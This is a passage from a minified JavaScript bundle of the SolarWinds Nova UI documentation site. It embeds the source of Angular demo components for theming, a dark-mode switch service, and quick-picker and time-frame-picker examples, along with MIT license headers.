Theme\n</nui-switch>\n'},59913:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t="// Provide alternate values for the nova-defined color variables\n// Note 1: This is only a subset of all nova-defined colors to provide the desired effect for demo purposes only.\n//         The complete set can be found here: https://github.com/solarwinds/nova/blob/main/packages/bits/src/styles/nui-framework-colors.less\n// Note 2: The alternate color values can optionally be provided in a separate file from the property assignment shown below.\n@page-header-border-color: red;\n@nui-color-bg-light: fuchsia;\n@nui-color-bg-content: fuchsia;\n@nui-color-bg-secondary: #009fc9;\n@nui-color-semantic-ok-bg: #009fc9;\n@nui-color-text-default: white;\n@nui-color-text-link: #fdf40e;\n\n// Assign the alternate colors defined above to the corresponding properties in the theme's CSS class\n// Note: Assigning the property values can be automated by the method shown here:\n// https://github.com/solarwinds/nova/blob/main/packages/bits/src/styles/nui-framework-theme.less\n.clown-party-theme {\n    --page-header-border-color: @page-header-border-color;\n    --nui-color-bg-light: @nui-color-bg-light;\n    --nui-color-bg-content: @nui-color-bg-content;\n    --nui-color-bg-secondary: @nui-color-bg-secondary;\n    --nui-color-semantic-ok-bg: @nui-color-semantic-ok-bg;\n    --nui-color-text-default: @nui-color-text-default;\n    --nui-color-text-link: @nui-color-text-link;\n}\n"},55537:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { DOCUMENT } from "@angular/common";\nimport {\n    Component,\n    Inject,\n    OnDestroy,\n    Renderer2,\n    RendererFactory2,\n    ViewEncapsulation,\n} from "@angular/core";\n\n@Component({\n    selector: "custom-theme-example",\n    templateUrl: "./custom-theme.example.component.html",\n    styleUrls: ["./custom-theme.example.component.less"],\n    encapsulation: ViewEncapsulation.None,\n})\nexport class CustomThemeExampleComponent implements OnDestroy {\n    private readonly renderer: Renderer2;\n    private readonly containerElement: Element;\n    private readonly customClassName = "clown-party-theme";\n\n    // Inject the RendererFactory2 for manipulating the DOM and inject the document for manipulation\n    constructor(\n        rendererFactory: RendererFactory2,\n        @Inject(DOCUMENT) document: Document\n    ) {\n        // Get the root html element\n        this.containerElement = document.children[0];\n        // Create a renderer instance\n        this.renderer = rendererFactory.createRenderer(null, null);\n    }\n\n    public ngOnDestroy(): void {\n        // cleanup\n        this.renderer.removeClass(this.containerElement, this.customClassName);\n    }\n\n    public setTheme(value: boolean): void {\n        // add/remove the custom class to the root html element based on the switch\'s value\n        this.renderer[value ? "addClass" : "removeClass"](\n            this.containerElement,\n            this.customClassName\n        );\n    }\n}\n'},38671:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-switch\n    (valueChange)="themeSwitchService.setDarkTheme($event)"\n    [value]="themeSwitchService.isDarkModeEnabledSubject | async"\n    i18n\n>\n    Dark Theme\n</nui-switch>\n'},11959:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, OnInit } from "@angular/core";\n\nimport { ThemeSwitchService } from "@nova-ui/bits";\n\n@Component({\n    selector: "theme-switch-service-example",\n    templateUrl: "./theme-switch-service.example.component.html",\n})\nexport class ThemeSwitchServiceExampleComponent implements OnInit, OnDestroy {\n    // Inject the service\n    constructor(public themeSwitchService: ThemeSwitchService) {}\n\n    public ngOnInit(): void {\n        // Configure the service to listen for changes to the system color scheme preference.\n        // If the user already has dark mode enabled, the service will set the theme as soon\n        // as this method is called.\n        this.themeSwitchService.enableColorSchemePreferenceHandling();\n    }\n\n    public ngOnDestroy(): void {\n        // Switch back to the default theme\n        this.themeSwitchService.setDarkTheme(false);\n        // Stop the service from listening for changes to the system color scheme preference.\n        this.themeSwitchService.disableColorSchemePreferenceHandling();\n    }\n}\n'},12735:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<h1>Theming</h1>\n\n<p>\n    Nova currently supports two themes out of the box: <em>light</em> and\n    <em>dark</em>. By default, apps using Nova are styled with the light theme.\n</p>\n\n<h2>Theme Switch Service</h2>\n<p>\n    To configure your app to use the dark theme, you can add the\n    <code>dark-nova-theme</code> class to the app\'s root\n    <code>html</code> element. But, you don\'t have to do it manually. Nova\n    provides a service that can be used to toggle the root\n    <code>html</code> element class on demand. To enable the dark theme, inject\n    the\n    <code\n        ><a href="../injectables/ThemeSwitchService.html" target="_blank"\n            >ThemeSwitchService</a\n        ></code\n    >\n    into a component and invoke its\n    <code\n        ><a\n            href="../injectables/ThemeSwitchService.html#setDarkTheme"\n            target="_blank"\n            >setDarkTheme</a\n        ></code\n    >\n    method with a value of <code>true</code>. To disable the dark theme invoke\n    <code\n        ><a\n            href="../injectables/ThemeSwitchService.html#setDarkTheme"\n            target="_blank"\n            >setDarkTheme</a\n        ></code\n    >\n    with a value of <code>false</code>.\n</p>\n<p>\n    Additionally, the service can be used to configure your app to respond to\n    the user\'s light/dark mode system preference. To configure your app to do\n    this, invoke the service\'s\n    <code\n        ><a\n            href="../injectables/ThemeSwitchService.html#enableColorSchemePreferenceHandling"\n            target="_blank"\n            >enableColorSchemePreferenceHandling</a\n        ></code\n    >\n    method. If the user has configured their operating system to use the\n    system-wide dark theme, your app will automatically be displayed with the\n    dark theme. To disable system preference handling, invoke the\n    <code\n        ><a\n            href="../injectables/ThemeSwitchService.html#disableColorSchemePreferenceHandling"\n            target="_blank"\n            >disableColorSchemePreferenceHandling</a\n        ></code\n    >\n    method.\n</p>\n<p>\n    The following example configures the service to respond to the user\'s\n    light/dark system preference. To try it out, follow these links on how to\n    change the setting for\n    <a\n        href="https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/set-dark-mode"\n        target="_blank"\n        >Windows 10</a\n    >\n    and\n    <a href="https://support.apple.com/en-us/HT208976" target="_blank">MacOS</a\n    >.\n</p>\n<p>\n    Additionally, the example invokes\n    <code\n        ><a\n            href="../injectables/ThemeSwitchService.html#setDarkTheme"\n            target="_blank"\n            >setDarkTheme</a\n        ></code\n    >\n    with <code>true</code> or <code>false</code> each time the switch is\n    toggled.\n</p>\n<nui-example-wrapper\n    filenamePrefix="theme-switch-service.example"\n    exampleTitle="Theme Switch Service"\n>\n    <theme-switch-service-example></theme-switch-service-example>\n</nui-example-wrapper>\n\n<h3>Additional Properties</h3>\n<ul>\n    <li>\n        <code\n            ><a\n                href="../injectables/ThemeSwitchService.html#isDarkModeEnabledSubject"\n                target="_blank"\n                >isDarkModeEnabledSubject</a\n            ></code\n        >\n        - The example above uses this <code>BehaviorSubject</code> in its\n        template to determine whether dark mode is enabled.\n    </li>\n    <li>\n        <code\n            ><a\n                href="../injectables/ThemeSwitchService.html#withRefreshRoute"\n                target="_blank"\n                >withRefreshRoute</a\n            ></code\n        >\n        - Set this boolean to true if you want the route to refresh each time\n        the theme changes. This can come in handy if you have elements on the\n        page whose styles can\'t be changed on the fly for some reason.\n    </li>\n</ul>\n\n<h2>Participation</h2>\n<p>\n    To have the colors in your app participate in theming, ensure that the\n    values of your color-oriented properties such as <code>background</code> or\n    <code>border</code> take the form of CSS variables by invoking the CSS\n    <code\n        ><a\n            href="https://www.w3schools.com/css/css3_variables.asp"\n            target="_blank"\n            >var</a\n        ></code\n    >\n    function with the desired color property name and an optional fallback\n    value. This will convert the CSS color properties defined by Nova to CSS\n    variables whose values will update to correspond to the active theme.\n</p>\n<nui-example-code language="less">\n    {{ lessCode }}\n</nui-example-code>\n\n<h2>Custom Themes</h2>\n<p>It\'s possible to create a custom theme by doing the following:</p>\n<ol>\n    <li>\n        Provide alternate values for Nova\'s Less color variables defined\n        <a\n            href="https://github.com/solarwinds/nova/blob/main/packages/bits/src/styles/nui-framework-colors.less"\n            target="_blank"\n            >here</a\n        >.\n    </li>\n    <li>\n        Create a CSS class containing color properties that use the alternate\n        color values.\n    </li>\n    <li>\n        Use Angular\'s\n        <code\n            ><a href="https://angular.io/api/core/Renderer2" target="_blank"\n                >Renderer2</a\n            ></code\n        >\n        to add the custom class to the element you want to apply the colors to.\n    </li>\n</ol>\n<p>\n    The following example applies a totally unusable clownish party theme to the\n    root <code>html</code>\n    element when the switch is turned on. To see how the alternate color\n    variables and properties are defined, take a look at the less file in the\n    source expander.\n</p>\n<nui-example-wrapper\n    filenamePrefix="custom-theme.example"\n    exampleTitle="Custom Themes"\n>\n    <custom-theme-example></custom-theme-example>\n</nui-example-wrapper>\n'},1227:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t=":host {\n    ul {\n        padding-left: 40px;\n        li {\n            list-style: disc;\n        }\n    }\n}\n"},86791:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "theming-docs-example",\n    templateUrl: "./theming-docs.example.component.html",\n    styleUrls: ["./theming-docs.example.component.less"],\n})\nexport class ThemingDocsExampleComponent {\n    public lessCode = `\n@import (reference) "nui-framework-variables";\n\n.sample-class {\n    background: var(--nui-color-bg-workspace, @nui-color-bg-workspace)\n    border: 1px solid var(--nui-color-line-default, @nui-color-line-default);\n}`;\n}\n'},85275:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiDocsModule,\n    NuiMessageModule,\n    NuiSwitchModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport { CustomThemeExampleComponent } from "./custom-theme/custom-theme.example.component";\nimport { ThemeSwitchServiceExampleComponent } from "./theme-switch-service/theme-switch-service.example.component";\nimport { ThemingDocsExampleComponent } from "./theming-docs/theming-docs.example.component";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: ThemingDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n        },\n    },\n    {\n        path: "theme-switch-service",\n        component: ThemeSwitchServiceExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "custom-theme",\n        component: CustomThemeExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiMessageModule,\n        NuiDocsModule,\n        NuiSwitchModule,\n        RouterModule.forChild(routes),\n    ],\n    declarations: [\n        CustomThemeExampleComponent,\n        ThemingDocsExampleComponent,\n        ThemeSwitchServiceExampleComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("theming"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class ThemingModule {}\n'},15631:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./time-frame-picker-docs/time-frame-picker-docs.example.component";\nexport * from "./time-frame-picker-basic/time-frame-picker-basic.example.component";\nexport * from "./time-frame-picker-custom/time-frame-picker-custom.example.component";\nexport * from "./quick-picker-basic/quick-picker-basic.example.component";\nexport * from "./time-frame-picker-inline/time-frame-picker-inline.example.component";\nexport * from "./time-frame-picker-date/time-frame-picker-date.example.component";\nexport * from "./time-frame-picker-test/time-frame-picker-test.example.component";\nexport * from "./time-frame-picker-visual-test/time-frame-picker-visual-test.component";\nexport * from "./time-frame-picker-multiple-custom-pickers/time-frame-picker-multiple-custom-pickers.example.component";\n'},7781:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-quick-picker\n    [presets]="presets"\n    [selectedPreset]="selectedPresetKey"\n    (presetSelected)="handlePresetSelection($event)"\n    pickerTitle="Custom percentiles"\n    [presetKeysOrder]="presetKeysOrder"\n    i18n-pickerTitle\n>\n    <nui-textbox-number\n        [maxValue]="100"\n        (valueChange)="handleCustomSelection($event)"\n        [value]="getTextboxValue()"\n    >\n    </nui-textbox-number>\n</nui-quick-picker>\n\n<span class="nui-text-secondary"\n    >Selected Quick Pick is {{ selectedPresetKey || "null" }}, Selected Value is\n    {{ selectedValue }}</span\n>\n'},58369:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\nimport { IQuickPickPresetDictionary } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-quick-picker-basic",\n    templateUrl: "./quick-picker-basic.example.component.html",\n})\nexport class QuickPickerBasicExampleComponent {\n    public presets: IQuickPickPresetDictionary = {\n        "99": {\n            name: "99-th percentile",\n        },\n        "95": {\n            name: "95-th percentile",\n        },\n        "80": {\n            name: "80-th percentile",\n        },\n    };\n    public presetKeysOrder = ["95", "99", "80"];\n    public selectedPresetKey?: string = "95";\n    public selectedValue: number = +(this.selectedPresetKey || "");\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedPresetKey = presetKey;\n        if (presetKey) {\n            this.selectedValue = +this.selectedPresetKey;\n        }\n    }\n\n    public handleCustomSelection(num: number): void {\n        if (Object.keys(this.presets).indexOf(num.toString()) !== -1) {\n            this.selectedPresetKey = num.toString();\n        } else {\n            this.selectedPresetKey = undefined;\n        }\n        this.selectedValue = num;\n    }\n\n    public getTextboxValue(): number {\n        return +(this.selectedPresetKey || "") || this.selectedValue;\n    }\n}\n'},92277:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    trigger="click"\n    [template]="popoverTimeFramePicker"\n    [hasPadding]="false"\n    [closePopover]="closePopoverSubject"\n    [modal]="true"\n>\n    <span class="nui-text-link" style="cursor: pointer">{{\n        acceptedTimeframe | timeFrame\n    }}</span>\n</nui-popover>\n\n<ng-template #popoverTimeFramePicker>\n    <div>\n        <nui-quick-picker\n            [presets]="presets"\n            [selectedPreset]="acceptedTimeframe.selectedPresetId"\n            (presetSelected)="handlePresetSelection($event)"\n            pickerTitle="Custom Range"\n            i18n-pickerTitle\n        >\n            <nui-time-frame-picker\n                [startModel]="acceptedTimeframe"\n                (changed)="updateTf($event)"\n            >\n            </nui-time-frame-picker>\n        </nui-quick-picker>\n    </div>\n    <nui-dialog-footer *ngIf="showFooter">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            class="pr-3 nui-time-frame-picker__cancel"\n            (click)="cancelPopover()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            class="nui-time-frame-picker__use"\n            (click)="confirmPopover()"\n            i18n\n        >\n            Use\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},58545:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport {\n    ITimeframe,\n    ITimeFramePresetDictionary,\n    TimeframeService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-basic-example",\n    templateUrl: "./time-frame-picker-basic.example.component.html",\n})\nexport class TimeFramePickerBasicExampleComponent {\n    public presets: ITimeFramePresetDictionary;\n    public selectedPresetKey?: string = "lastHour";\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe;\n\n    public showFooter: boolean = false;\n\n    constructor(public timeframeService: TimeframeService) {\n        this.presets = timeframeService.getDefaultPresets();\n        this.acceptedTimeframe = this.timeframeService.getTimeframeByPresetId(\n            this.selectedPresetKey\n        );\n        this.tf = this.acceptedTimeframe;\n    }\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public updateTf(value: ITimeframe): void {\n        this.tf = value;\n\n        const timeFrameDatesValid = () =>\n            this.timeframeService.areTimeFrameDatesValid(value);\n        const timeFrameDatesEqual = () =>\n            this.timeframeService.isEqual(this.tf, this.acceptedTimeframe);\n        if (timeFrameDatesValid() && !timeFrameDatesEqual()) {\n            this.showFooter = true;\n        }\n\n        this.selectedPresetKey = this.tf.selectedPresetId;\n    }\n\n    public confirmPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n    }\n\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedPresetKey = presetKey;\n        this.tf = this.timeframeService.getTimeframeByPresetId(presetKey);\n        this.acceptedTimeframe = this.tf;\n        this.closePopoverSubject.next();\n    }\n}\n'},90427:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    trigger="click"\n    [template]="popoverTimeFramePicker"\n    [hasPadding]="false"\n    [closePopover]="closePopoverSubject"\n    [modal]="true"\n>\n    <span class="nui-text-link" style="cursor: pointer">{{\n        acceptedTimeframe | timeFrame\n    }}</span>\n</nui-popover>\n\n<ng-template #popoverTimeFramePicker>\n    <div>\n        <nui-quick-picker\n            [presets]="presets"\n            [selectedPreset]="acceptedTimeframe.selectedPresetId"\n            (presetSelected)="handlePresetSelection($event)"\n            pickerTitle="Custom Range"\n            i18n-pickerTitle\n        >\n            <nui-time-frame-picker\n                [startModel]="acceptedTimeframe"\n                (changed)="updateTf($event)"\n            >\n            </nui-time-frame-picker>\n        </nui-quick-picker>\n    </div>\n    <nui-dialog-footer *ngIf="showFooter">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            class="pr-3 nui-time-frame-picker__cancel"\n            (click)="cancelPopover()"\n            i18n\n        >\n            Cancel\n        </button>\n        <button\n            nui-button\n            type="button"\n            displayStyle="primary"\n            class="nui-time-frame-picker__use"\n            (click)="confirmPopover()"\n            i18n\n        >\n            Use\n        </button>\n    </nui-dialog-footer>\n</ng-template>\n'},65059:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { Subject } from "rxjs";\n\nimport {\n    ITimeframe,\n    ITimeFramePresetDictionary,\n    TimeframeService,\n} from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-time-frame-picker-custom",\n    templateUrl: "./time-frame-picker-custom.example.component.html",\n    providers: [TimeframeService],\n})\nexport class TimeFramePickerCustomExampleComponent {\n    public presets: ITimeFramePresetDictionary = {\n        last42Hours: {\n            name: $localize`Last 42 hours`,\n            startDatetimePattern: { hours: -42 },\n            endDatetimePattern: {},\n        },\n        last749Days: {\n            name: $localize`Last 749 days`,\n            startDatetimePattern: { days: -749 },\n            endDatetimePattern: {},\n        },\n    };\n    public selectedPresetKey?: string = "last42Hours";\n    public acceptedTimeframe: ITimeframe;\n    public tf: ITimeframe;\n\n    public showFooter: boolean = false;\n\n    constructor(public timeframeService: TimeframeService) {\n        this.timeframeService.currentPresets = this.presets;\n        this.acceptedTimeframe = this.timeframeService.getTimeframeByPresetId(\n            this.selectedPresetKey\n        );\n        this.tf = this.acceptedTimeframe;\n    }\n\n    public closePopoverSubject = new Subject<void>();\n    public openPopoverSubject = new Subject<void>();\n\n    public updateTf(value: ITimeframe): void {\n        this.tf = value;\n        const timeFrameDatesValid = () =>\n            this.timeframeService.areTimeFrameDatesValid(value);\n        const timeFrameDatesEqual = () =>\n            this.timeframeService.isEqual(this.tf, this.acceptedTimeframe);\n        if (timeFrameDatesValid() && !timeFrameDatesEqual()) {\n            this.showFooter = true;\n        }\n\n        this.selectedPresetKey = this.tf.selectedPresetId;\n    }\n\n    public confirmPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n        this.acceptedTimeframe = this.tf;\n    }\n    public cancelPopover(): void {\n        this.showFooter = false;\n        this.closePopoverSubject.next();\n    }\n\n    public handlePresetSelection(presetKey: string): void {\n        this.selectedPresetKey = presetKey;\n        this.tf = this.timeframeService.getTimeframeByPresetId(presetKey);\n        this.acceptedTimeframe = this.tf;\n        this.closePopoverSubject.next();\n    }\n}\n'},14349:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-popover\n    trigger="click"\n    [template]="popoverDayPicker"\n    [hasPadding]="false"\n    [closePopover]="closePopoverSubject"\n    [unlimited]="true"\n    [modal]="true"\n>\n    <span class="nui-text-link" style="cursor: pointer">Select day</span>\n</nui-popover>\n\n<p>\n    Selected date:\n    <em>{{ selectedDate?.format("MMMM Do, YYYY") }}</em>\n</p>\n\n<ng-template #popoverDayPicker>\n    <div>\n        <nui-quick-picker\n            [presets]="presets"\n            [selectedPreset]="selectedPresetKey"\n            (presetSelected)="handlePresetSelection($event)"\n            pickerTitle="Custom Date"\n            i18n-pickerTitle\n            presetsTitle="Baselines"\n            i18n-presetsTitle\n        >\n            <nui-date-picker\n                [inline]="true"\n                [value]="selectedDate"\n                [preserveInsignificant]="false"\n                (valueChange)="dateChanged($event)"\n            >\n            </nui-date-picker>\n        </nui-quick-picker>\n    </div>\n</ng-template>\n'},20217:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby 